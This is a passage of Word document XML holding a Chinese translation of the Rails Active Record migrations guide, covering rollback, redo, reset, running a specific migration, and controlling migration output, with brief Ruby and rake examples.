                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake db:rollback STEP=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7522371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这样会执行最后3个migrations的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA8998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要回滚然后重新执行最后一个migration的话可以直接执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:migrate:redo</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。如果要回滚 重新执行的不止一个版本时可以用STEP参数，就跟</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:rollback</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的用法一样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3320B2B7" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B172CDC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="864827798"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake db:migrate:redo STEP=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0874D23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这两个rake任务只是用起来比较方便，让你可以不用输入一大串版本号数字。除了输入比较 方便外没有比</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>多做什么额外的工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B0BF74"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4.2 重置数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAD7F3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最后是</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:reset</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>任务，它会删除数据库，然后重新建立数据库并在重新建立的数据库中 载入当前的schema。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F60BB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所谓的载入schema跟执行全部的migrations是不一样的，请参照： </w:t>
      </w:r>
      <w:hyperlink r:id="rId129" w:anchor="schema-dumping-and-you" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>schema.rb</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2B4D4F"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4.3 执行指定的migration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B41988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如果你需要执行一个指定的migration的up或down方法，那么你可以用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:migrate:up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:migrate:down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>这两个任务。你只需指定版本号，就可以触发它的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0E13A70C" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E856229" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1402100982"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake db:migrate:up VERSION=20080906120000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22FC3D6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以上会执行20080906120000这个版本的migration的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">方法。它会去确认这个migration之前有 没有跑过，所以，如果Active Record认为20080906120000已经跑过，那么执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:migrate:up VERSION=20080906120000</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>将不会做任何操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CD0557"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4.4 修改执行migration时的提示结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7152C1C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默认情况下，migrations会告诉你它们在做什么，花多少时间。例如建立数据库并且添加 索引(index)的话会产生以下输出结果：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="72073FE3" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EE0F41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CreateProducts: migrating =================================================</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="670004E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create_table(:products)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06C995E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-&gt; 0.0028s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E893D7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CreateProducts: migrated (0.0028s) ========================================</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B2AE2E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想要控制这些输出值的话可以使用这几种方法：</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6281"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7424B6DA" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="574E6525" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">Method </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="758B1800" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="40951ABA" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F87B6F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xml:space="preserve">suppress_messages </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5482FF9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阻止这个代码块的任何输出结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="23A8DCD2" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="332F329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xml:space="preserve">say </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34B5206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输出一段文字（第二个参数可以指定是否要缩排）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="349F583B" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="202C301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xml:space="preserve">say_with_time </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A3EC1D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输出一段文字，以及这个代码块需要花多少时间才能跑完。如果代 码块中回传了一个整数，这个数代表受影响的数据(rows)有多少。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6008A45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例如以下这个migration</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="640BDD05" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4694FCA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CreateProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CACD60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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D9C8C9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suppress_messages do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29CA247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create_table :products</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4AE6D30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t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="143BC5C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t.text :description</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="541E7F1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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30FF5AF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4F52ABD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31977B0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say "Created a table"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B5865A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suppress_messages {add_index :products, :name}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2941BAC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say "and an index!", true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59A618D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say_with_time 'Waiting for a while'</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p>
          <w:p w14:paraId="5414AA3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sleep 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37D2778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250</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="203FC8A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4A00EC3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207282A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362AEF2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会产生这样的输出结果：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3742F852" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2826231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CreateProducts: migrating =================================================</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A1D9E8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Created a table</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D573AB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-&gt; and an index!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5675707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Waiting for a while</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7268CFE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-&gt; 10.0013s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39FD047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-&gt; 250 rows</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AA06B5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CreateProducts: migrated (10.0054s) =======================================</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F3D241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如果你希望Active Record不作任何输出，那么执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate VERBOSE=false</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>就可 以阻止所有的输出结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079EC9C6"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5 在Migrations中使用Models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AF599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在migration中不管你是新增数据或者更新数据，多少都会用到一个model。毕竟model存在 就是为了方便地处理我们的数据。这当然是没问题的，只是有些地方需要留意一下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0DCE1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比方说，当model使用不正确的数据库的字段或者使用的字段是后来的migration创建的时候 就会出现问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA79A6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根据这个例子，当爱丽比和鲍勃在同一份代码上工作，这份代码包含一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Product</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的模型：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BDC143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鲍勃正在放假期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2501AE3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爱丽丝创建了一个migration给</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>products</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">表添加一个新的字段并为它初始化。她同时在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Product</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模型为这个新的字段添加了验证(validation)。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="2303914D" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C8490E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db/migrate/20100513121110_add_flag_to_product.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14B8A8F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0B37EA6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AddFlagToProduct &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B28018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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48CF73E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add_column :products, :flag, :boolean</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="599E596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Product.all.each</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|product|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AD9BC1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product.update_attributes!(:flag</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E124E4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1F518D9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16B1187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r w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="61184EB9" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
